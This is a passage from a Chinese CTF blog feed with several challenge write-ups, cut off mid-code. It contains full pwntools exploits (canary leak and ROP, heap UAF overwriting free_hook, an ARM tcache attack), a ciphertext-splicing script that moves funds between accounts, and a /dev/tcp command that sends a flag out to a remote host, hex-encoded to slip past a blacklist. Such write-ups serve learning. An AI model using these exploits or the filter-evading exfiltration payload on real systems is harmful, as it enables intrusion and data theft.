class="params">(usname,passwd,url)</span>:</span></span><br><span class="line">usname = usname</span><br><span class="line">passwd = passwd</span><br><span class="line">url = url</span><br><span class="line">data = &#123;<span class="string">'username'</span>:usname,<span class="string">'password'</span>:passwd&#125;</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line"><span class="comment">#return r.headers</span></span><br><span class="line"><span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span><span class="params">(token,url)</span>:</span></span><br><span class="line">token = token</span><br><span class="line">url = url</span><br><span class="line">data = &#123;<span class="string">'api_token'</span>:token&#125;</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line"><span class="keyword">return</span> r.json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(enc,url)</span>:</span></span><br><span class="line">enc = enc</span><br><span class="line">url = url </span><br><span class="line">data = &#123;<span class="string">"enc"</span>:enc&#125;</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line"><span class="keyword">return</span> r.json</span><br><span class="line"></span><br><span class="line">passwd = <span class="number">123</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">usname = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(random.randint(<span class="number">0</span>,<span class="number">20</span>)):</span><br><span class="line">usname += random.choice(usnamelist)</span><br><span class="line">print(register(usname,passwd,register_url))</span><br></pre></td></tr></table></figure><p>可以利用 linux 的管道方便地拿到满足要求的用户信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 lottery爆破用户名.py | grep <span class="string">'"uuid":"bc'</span></span><br><span class="line">b<span class="string">'&#123;"user":&#123;"username":"misiifcyboqwa","uuid":"bca638f6-ffb4-4c12-8c79-42add23d90e5","updated_at":"2020-07-01T05:41:02.000000Z","created_at":"2020-07-01T05:41:02.000000Z","id":630605&#125;&#125;'</span></span><br><span class="line">b<span class="string">'&#123;"user":&#123;"username":"pnihrkpjeocgynhz","uuid":"bce2d26c-92fa-48fc-a2c2-d5ff5e1da6f5","updated_at":"2020-07-01T05:42:09.000000Z","created_at":"2020-07-01T05:42:09.000000Z","id":630734&#125;&#125;'</span></span><br><span class="line">b<span class="string">'&#123;"user":&#123;"username":"tkb","uuid":"bc10a197-1215-4c4e-bdbe-25145108198d","updated_at":"2020-07-01T05:42:46.000000Z","created_at":"2020-07-01T05:42:46.000000Z","id":630799&#125;&#125;'</span></span><br><span class="line">b<span class="string">'&#123;"user":&#123;"username":"csuxhbbrdtebsdpue","uuid":"bc87488d-caee-411a-bf4f-c75a17090b5a","updated_at":"2020-07-01T05:44:52.000000Z","created_at":"2020-07-01T05:44:52.000000Z","id":631052&#125;&#125;'</span></span><br><span class="line">b<span class="string">'&#123;"user":&#123;"username":"kncwealurtcj","uuid":"bc7a033e-d341-42a0-b931-08592ee81e2f","updated_at":"2020-07-01T05:47:43.000000Z","created_at":"2020-07-01T05:47:43.000000Z","id":631362&#125;&#125;'</span></span><br><span class="line">b<span class="string">'&#123;"user":&#123;"username":"cwbaszukw","uuid":"bc09265e-f0d6-4104-bd11-bd6d29835a00","updated_at":"2020-07-01T05:50:03.000000Z","created_at":"2020-07-01T05:50:03.000000Z","id":631663&#125;&#125;'</span></span><br><span class="line">b<span class="string">'&#123;"user":&#123;"username":"uhenpkasxlveidif","uuid":"bc00fef1-ec7b-48e6-bc86-3f2ee89da15b","updated_at":"2020-07-01T05:51:13.000000Z","created_at":"2020-07-01T05:51:13.000000Z","id":631786&#125;&#125;'</span></span><br><span class="line">b<span class="string">'&#123;"user":&#123;"username":"vwurpqhaavjihvuqokyx","uuid":"bc248486-e6d2-437d-8b2d-ee2c3dad1a72","updated_at":"2020-07-01T05:55:55.000000Z","created_at":"2020-07-01T05:55:55.000000Z","id":632333&#125;&#125;'</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>然后用下面的代码进行替换，将其他用户的 lottery 替换掉 user1 的 lottery，如此以来，就可以将其他用户的 coin 转移给 user1了，即可购买 flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">now_c = <span class="string">"IpG6gymO3Jhd9hgirFfF\\/GZ9An9W7hmfpWnFZEvQ9V4wKQrh4UbaaAm0rp2g2I4WirFyVLzg5KZKQxsPrT53Wot80sjMPhsXy0irOua24Da9KDh1YiMsqS6Q6KJWU5xTdbZ34x8c0bloA9X4\\/fMN6vbSt9reYD8AcCI4hIXsxZg="</span></span><br><span class="line"><span class="comment">#now_c = now_c.decode('utf-8')</span></span><br><span class="line">another_c = <span class="string">"RNeqoksqjZqjs30IlB4JPaQykvrhhJLviciRBGyYNT0DZbqCkAeQT3L9wJeKwt2FtxIuzzKznobqBur9sRvygvv3jwyYLL1MQR7+AzHT7kug1CQEqkGMqmKZk4ZsdpGluPGbrp5x9YrQ3PKM0MXGcvbSt9reYD8AcCI4hIXsxZg="</span></span><br><span class="line"><span class="comment">#another_c = another_c.decode('utf-8')</span></span><br><span class="line"></span><br><span class="line">now_c = base64.b64decode(now_c).encode(<span class="string">'hex'</span>)</span><br><span class="line">another_c = base64.b64decode(another_c).encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> now_c</span><br><span class="line"><span class="keyword">print</span> another_c</span><br><span class="line"></span><br><span class="line">index = <span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> urllib.quote(base64.b64encode((another_c[:index] + now_c[index:]).decode(<span class="string">'hex'</span>)))</span><br></pre></td></tr></table></figure><p>注意由于每个 lottery 只能用一次，因此每个用于提供 coin 的用户每次都要重新生成 lottery，然后对 user1 的lottery进行替换即可。</p><p>还需要注意一点，由于 token 的存在，同一台 PC 只能保持一个用户的连接，再开一台虚拟机登录其他用户提供 coin 即可。</p><p>效果如下：</p><p><img src="http://ggb0n.cool/images/tctf24.png" alt=""></p><p><img src="http://ggb0n.cool/images/tctf25.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;比赛的时候做题一头雾水，很多题一知半解，不能自己独立完成，赛后看飘零师傅的题解进一步学习。
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="比赛划水" scheme="http://ggb0n.cool/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"/>
    
    
      <category term="无参数RCE" scheme="http://ggb0n.cool/tags/%E6%97%A0%E5%8F%82%E6%95%B0RCE/"/>
    
      <category term="open-basedir绕过" scheme="http://ggb0n.cool/tags/open-basedir%E7%BB%95%E8%BF%87/"/>
    
      <category term="XSS" scheme="http://ggb0n.cool/tags/XSS/"/>
    
      <category term="FFI" scheme="http://ggb0n.cool/tags/FFI/"/>
    
      <category term="ImageMagick" scheme="http://ggb0n.cool/tags/ImageMagick/"/>
    
      <category term="分组密码重放攻击" scheme="http://ggb0n.cool/tags/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>第五空间pwn题练习</title>
    <link href="http://ggb0n.cool/2020/06/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4pwn%E9%A2%98%E7%BB%83%E4%B9%A0/"/>
    <id>http://ggb0n.cool/2020/06/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4pwn%E9%A2%98%E7%BB%83%E4%B9%A0/</id>
    <published>2020-06-26T15:37:19.000Z</published>
    <updated>2020-07-26T04:56:47.545Z</updated>
    
    <content type="html"><![CDATA[<p>自做pwn题以来第一次打比赛，真正遇到题目果然是一脸懵逼。。。拿着师傅们的wp学习<a id="more"></a></p><h3 id="twice"><a href="#twice" class="headerlink" title="twice"></a>twice</h3><p>拿到题目，看一下文件属性是64位的ELF，可以实现回显用户输入的功能。</p><p>查看一下保护，发现开启了<code>NX</code>、<code>canary</code>：</p><p><img src="http://ggb0n.cool/images/5kj01.png" alt=""></p><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>IDA反编译发现到<code>sub_4007A9</code>函数调用了puts函数，可以实现栈溢出</p><p><img src="http://ggb0n.cool/images/5kj03.png" alt=""></p><p>其中栈结构如下：</p><p><img src="http://ggb0n.cool/images/5kj04.png" alt=""></p><p>可知，我们输入的字符串被保存到参数<code>s</code>的位置，它到<code>var_8</code>（其实就是canary）的大小是<code>0x58</code>字节，因此溢出的难点就在于如何绕过canary的检测，这里由于是会回显用户输入的字符串，那么在0x58个字符之后再输入一个字符覆盖canary的<code>\x00</code>字节，那么就可以将canary连带一起输入，其后的栈底地址也能一同输出，这便是突破点。</p><p>那么整体思路就是：第一次输入通过覆盖canary低字节泄露canary和rbp，第二次输入做栈迁移泄露出libc基址，随后再次迁移到栈顶位置然后构造payload覆盖返回地址为one_gadget，即可getshell。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>比赛的时候好像没有提供 libc 版本，这样的话就多了一步 libc版本的确定，不过在复现的时候看到师傅直接写了<code>libc-2.23.so</code>，这样也方便学习了。</p><p>先找一下64位<code>libc-2.23.so</code>中的gadget：</p><p><img src="http://ggb0n.cool/images/5kj05.png" alt=""></p><p>最终exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'5kjpwn1'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./5kjpwn1'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">rdi_ret = <span class="number">0x400923</span></span><br><span class="line">push_ebp = <span class="number">0x4007a9</span></span><br><span class="line">leave_ret = <span class="number">0x400879</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x58</span> + <span class="string">'b'</span></span><br><span class="line">sh.sendafter(<span class="string">'&gt;'</span>, payload1)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'b'</span>)</span><br><span class="line">canary = u64((sh.recv(<span class="number">7</span>)).rjust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">stack = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'c'</span>*<span class="number">0x08</span> + p64(rdi_ret) + p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.plt[<span class="string">'puts'</span>]) + p64(push_ebp)</span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x58</span>, <span class="string">'a'</span>)</span><br><span class="line">payload2 += p64(canary) + p64(stack<span class="number">-0x70</span>) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">'&gt;'</span>, payload2)</span><br><span class="line">sh.recvuntil(<span class="string">'cccccccc'</span>)</span><br><span class="line">puts_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">'a'</span>*<span class="number">0x58</span> + p64(canary) + p64(<span class="number">0</span>) + p64(libc_base + <span class="number">0x45216</span>)</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">'&gt;'</span>, payload3)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="of"><a href="#of" class="headerlink" title="of"></a>of</h3><p>这是一道堆题，题目有<code>allocate, edit, show, delete</code>几个功能。出题方从<code>urandom</code>读了一个8字节的随机数当做<code>cookie</code>，只有<code>cookie</code>正确才能做操作，free的时候把<code>cookie</code>清零。<br>然而编译器(<code>gcc</code>和<code>clang</code>)都会把这个清0操作给优化掉，导致<code>UAF</code>。</p><h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>讲真的，看师傅们的exp没看懂是怎么搞的，堆题之前也没刷过呢。。。</p><p>远程测试发现和源码不同，没有了cookie操作，直接改free_hook调用system即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">": "</span>,<span class="string">"1"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">": "</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,note)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">": "</span>,<span class="string">"2"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"Index: "</span>,str(index))</span><br><span class="line">   p.sendafter(<span class="string">"Content: "</span>,note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">": "</span>,<span class="string">"3"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"Index: "</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">": "</span>,<span class="string">"4"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">": "</span>,str(index))</span><br><span class="line"><span class="comment">#p=remote("121.36.74.70",9999)</span></span><br><span class="line">p=process(<span class="string">"./5kjpwn2"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">   add(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">   delete(i)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">": "</span>)</span><br><span class="line">libc=u64(p.recv(<span class="number">6</span>)+<span class="string">"\x00\x00"</span>)<span class="number">-0x7ffff7dcfca0</span>+<span class="number">0x7ffff79e4000</span></span><br><span class="line"><span class="keyword">print</span> hex(libc)</span><br><span class="line">edit(<span class="number">6</span>,p64(libc+<span class="number">0x003ed8e8</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">add(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">11</span>,p64(libc+<span class="number">0x04f440</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwnme"><a href="#pwnme" class="headerlink" title="pwnme"></a>pwnme</h3><p>一道heap题目，只不过环境变成了<code>uclibc + arm</code>，因为uclibc当中也加入了tcache的机制，所以可以通过tcache机制对heap上的地址进行泄露，然后在<code>edit</code>函数当中能够溢出任意大小的字节。因此可以修改堆后面的数据，通过tcache attack，劫持程序的控制流就能够进行ROP，最后获得程序的控制权。</p><h4 id="arm架构程序的调试"><a href="#arm架构程序的调试" class="headerlink" title="arm架构程序的调试"></a>arm架构程序的调试</h4><p>需要有<code>qemu</code>的环境，然后按照如下步骤启动终端进行调试：</p><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">sudo mv ld-uClibc-<span class="number">1.0</span>.<span class="number">34</span>.so ld-uClibc.so.<span class="number">0</span></span><br><span class="line">sudo mv ld-uClibc.so.<span class="number">0</span> /<span class="class"><span class="keyword">lib</span>/</span></span><br><span class="line">sudo mv libuClibc-<span class="number">1.0</span>.<span class="number">34</span>.so libc.so.<span class="number">0</span></span><br><span class="line">sudo mv libc.so.<span class="number">0</span> /<span class="class"><span class="keyword">lib</span>/</span></span><br></pre></td></tr></table></figure><p>之后执行如下命令即可运行程序</p><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">qemu-arm -L ./<span class="class"><span class="keyword">lib</span> ./<span class="title">a</span>.<span class="title">out</span></span></span><br></pre></td></tr></table></figure><p>按照下面的操作可进行调试：</p><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">qemu-arm -g <span class="number">1234</span> -L ./<span class="class"><span class="keyword">lib</span> ./<span class="title">a</span>.<span class="title">out</span></span></span><br></pre></td></tr></table></figure><p>然后另开一个终端</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">gdb-multiarch ./<span class="selector-tag">a</span><span class="selector-class">.out</span> -q</span><br><span class="line">pwndbg&gt; target remote localhost:<span class="number">1234</span></span><br></pre></td></tr></table></figure><p>即可调试。</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">     p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(l,note)</span>:</span></span><br><span class="line">     p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">":"</span>,str(l))</span><br><span class="line">     p.sendafter(<span class="string">":"</span>,note)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(index,l,note)</span>:</span></span><br><span class="line">     p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">     p.sendlineafter(<span class="string">":"</span>,str(l))</span><br><span class="line">     p.sendafter(<span class="string">":"</span>,note)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(index)</span>:</span></span><br><span class="line">     p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line"><span class="keyword">if</span> len(sys.argv)==<span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p=process(["qemu-arm","-g","1234","-L","./","./a.out"])</span></span><br><span class="line">     p=remote(<span class="string">"121.36.58.215"</span>,<span class="number">1337</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=process([<span class="string">"qemu-arm"</span>,<span class="string">"-L"</span>,<span class="string">"./"</span>,<span class="string">"./a.out"</span>])</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"aaaaaaaa"</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>,<span class="string">"aaaaaaaa"</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"aaaaaaaa"</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"aaaaaaaa"</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">"a"</span>*<span class="number">0x1c</span>+p64(<span class="number">0x500</span>+<span class="number">0x20</span>+<span class="number">1</span>))</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>,<span class="string">"aaaaaaaa"</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"2 : "</span>)</span><br><span class="line">libc=u32(p.recv(<span class="number">4</span>))+<span class="number">0xff720000</span><span class="number">-0xff7ba8ec</span></span><br><span class="line"><span class="keyword">print</span> hex(libc)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"aaaaaaa"</span>)</span><br><span class="line">add(<span class="number">0x21</span>,<span class="string">"aaaaaaa"</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">4</span>)</span><br><span class="line">change(<span class="number">2</span>,<span class="number">8</span>,p32(<span class="number">0x21048</span>^<span class="number">0x22</span>))</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"aaaaa"</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"aaaaa"</span>)</span><br><span class="line">change(<span class="number">4</span>,<span class="number">0xf8</span>,<span class="string">"/bin/sh\x00"</span>+p32(<span class="number">0</span>)*<span class="number">4</span>+p32(<span class="number">0x28</span>)+p32(<span class="number">0x21038</span>))</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x8</span>,p32(libc+<span class="number">0x51800</span>))</span><br><span class="line"><span class="comment">#show()</span></span><br><span class="line">remove(<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;自做pwn题以来第一次打比赛，真正遇到题目果然是一脸懵逼。。。拿着师傅们的wp学习
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="赛题复现" scheme="http://ggb0n.cool/categories/CTF/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="ROP" scheme="http://ggb0n.cool/tags/ROP/"/>
    
      <category term="arm pwn" scheme="http://ggb0n.cool/tags/arm-pwn/"/>
    
      <category term="leak canary" scheme="http://ggb0n.cool/tags/leak-canary/"/>
    
      <category term="heap UAF" scheme="http://ggb0n.cool/tags/heap-UAF/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF六月月赛</title>
    <link href="http://ggb0n.cool/2020/06/25/DASCTF%E5%85%AD%E6%9C%88%E6%9C%88%E8%B5%9B/"/>
    <id>http://ggb0n.cool/2020/06/25/DASCTF%E5%85%AD%E6%9C%88%E6%9C%88%E8%B5%9B/</id>
    <published>2020-06-25T06:54:41.000Z</published>
    <updated>2020-07-26T04:57:23.071Z</updated>
    
    <content type="html"><![CDATA[<p>想做PWN来着，结果0解，划水几道题。。。<a id="more"></a></p><h3 id="简单的计算题"><a href="#简单的计算题" class="headerlink" title="简单的计算题"></a>简单的计算题</h3><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3 # -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request,session </span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> create </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">app = Flask(__name__) app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>) <span class="comment">## flag is in /flag try to get it </span></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST']) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(string)</span>:</span> </span><br><span class="line">    <span class="keyword">for</span> black_word <span class="keyword">in</span> black_list: </span><br><span class="line">        <span class="keyword">if</span> black_word <span class="keyword">in</span> string: </span><br><span class="line">            <span class="keyword">return</span> <span class="string">"hack"</span> </span><br><span class="line">        <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">'POST'</span>: </span><br><span class="line">input = request.form[<span class="string">'input'</span>] </span><br><span class="line">create_question = create() </span><br><span class="line">input_question = session.get(<span class="string">'question'</span>) </span><br><span class="line">session[<span class="string">'question'</span>] = create_question </span><br><span class="line"><span class="keyword">if</span> input_question==<span class="literal">None</span>: </span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"Invalid session please try again!"</span>, question=create_question) </span><br><span class="line"><span class="keyword">if</span> filter(input)==<span class="string">"hack"</span>: </span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"hack"</span>, question=create_question) </span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">calc_result = str((eval(input_question + <span class="string">"="</span> + str(input)))) </span><br><span class="line"><span class="keyword">if</span> calc_result == <span class="string">'True'</span>: </span><br><span class="line">result = <span class="string">"Congratulations"</span> </span><br><span class="line"><span class="keyword">elif</span> calc_result == <span class="string">'False'</span>: </span><br><span class="line">result = <span class="string">"Error"</span> </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line">result = <span class="string">"Invalid"</span> </span><br><span class="line"><span class="keyword">except</span>: </span><br><span class="line">result = <span class="string">"Invalid"</span> </span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=result,question=create_question) </span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">'GET'</span>: </span><br><span class="line">create_question = create() </span><br><span class="line">session[<span class="string">'question'</span>] = create_question </span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,question=create_question) </span><br><span class="line"><span class="meta">@app.route('/source') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span> </span><br><span class="line"><span class="keyword">return</span> open(<span class="string">"app.py"</span>, <span class="string">"r"</span>).read() </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: app.run(host=<span class="string">"0.0.0.0"</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>反弹shell，起初黑名单只有<code>or</code>，用下面payload即可：</p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">os.system(<span class="symbol">'bash</span> -c \<span class="string">"cat /flag &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\"</span>')</span><br></pre></td></tr></table></figure><p>改了之后<code>os</code>、<code>import</code>、<code>system</code>都被ban了，只能编码绕过，这里采用hex编码，先对上面的payload<a href="https://tool.lu/hexstr/">转为hex</a>：</p><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="number">6</span>f<span class="number">732e73797374656</span>d<span class="number">282762617368202</span>d<span class="number">63205</span><span class="keyword">c</span><span class="number">22636174202</span>f<span class="number">666</span><span class="keyword">c</span><span class="number">6167203e26202</span>f<span class="number">6465762</span>f<span class="number">7463702</span>f<span class="number">69702</span>f<span class="number">706</span>f<span class="number">727420303e26315</span><span class="keyword">c</span><span class="number">222729</span></span><br></pre></td></tr></table></figure><p>然后利用<code>bytes.fromhex()</code>函数转换</p><blockquote><p>bytes对象的hex函数，用来将bytes对象的值转换成hexstr；而fromhex函数，用来将<a href="https://www.pynote.net/archives/1628">hexstr</a>导入bytes对象，相当于用hexstr来创建bytes对象。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytes([<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]).hex()</span><br><span class="line"><span class="string">'000102030405'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytes.fromhex(<span class="string">'000102030405'</span>)</span><br><span class="line"><span class="string">b'\x00\x01\x02\x03\x04\x05'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">b'abcde'</span>.hex()</span><br><span class="line"><span class="string">'6162636465'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = bytes.fromhex(<span class="string">'6162636465'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="string">b'abcde'</span></span><br></pre></td></tr></table></figure><p>结合<code>exec()</code>函数即可执行反弹shell：</p><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">exec(bytes.fromhex('6f732e<span class="number">7379737465</span>6d<span class="number">28276261736820</span>2d<span class="number">6320</span>5c<span class="number">2263617420</span>2f666c<span class="number">616720</span>3e<span class="number">2620</span>2f<span class="number">646576</span>2f<span class="number">746370</span>2f<span class="number">6970</span>2f706f<span class="number">72742030</span>3e<span class="number">2631</span>5c<span class="number">222729</span>'))</span><br></pre></td></tr></table></figure><h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><p>本题运行时输出了printf函数的地址，并且开启了canary，原本以为可以通过它泄露canary，然后再次溢出拿shell的，可是尝试之后是无法覆盖canary的低字节从而将其泄露。看到师傅们的wp得知是<code>_IO_FILE</code>的题，伪造 vtable 劫持程序流程。</p><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>先看看远程的libc是什么版本，根据 printf 的地址，查到多个，最后确定了是 libc2.29</p><h5 id="libc2-29中的vtable"><a href="#libc2-29中的vtable" class="headerlink" title="libc2.29中的vtable"></a>libc2.29中的vtable</h5><p>libc2.29 貌似不能修改 vtable 的内容，而且对 vtable 指针有要求，但是 vtable 指针附近偏差不大的地方都没什么问题，而且可写。</p><p>那么就修改 __IO_2_1_stderr 的 vtable 指针的低两字节（只要和原来的位置偏差不大，而且可写就行，需要爆破)，然后往新的指针指向的地址写 3 个 qword，第三个刚好就是 io_finish 的位置，填上one_gadget 即可。</p><p>vtable 函数 指针：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The 'finish' function does any final cleaning up of an _IO_FILE object.</span></span><br><span class="line"><span class="comment">   It does not delete (free) it, but does everything else to finalize it.</span></span><br><span class="line"><span class="comment">   It matches the streambuf::~streambuf virtual destructor.  */</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span 